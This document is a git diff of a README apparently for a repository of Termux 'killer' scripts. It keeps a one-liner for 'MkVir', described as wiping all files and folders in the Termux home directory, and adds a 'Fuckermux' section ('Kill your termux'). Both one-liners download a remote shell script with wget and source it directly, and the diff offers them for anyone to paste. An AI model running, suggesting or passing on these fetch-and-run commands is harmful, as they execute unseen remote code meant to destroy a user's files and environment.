@@ -21,5 +21,11 @@ MkVir this is small script which cleans all files and folders in Home in Termux 
 ````
 pkg install wget && . <(wget -qO- https://raw.githubusercontent.com/Begitdj/Termux-Killer/refs/heads/main/Test.sh)
 ````
+# Fuckermux
+Kill your termux
+# One command to start
+````
+pkg install wget && . <(wget -qO- https://raw.githubusercontent.com/Begitdj/Termux-Killer-and-MkVir-Termux-/refs/heads/main/fuckermux.sh)
+````
 # Not Working?
 **Open new `issue`**
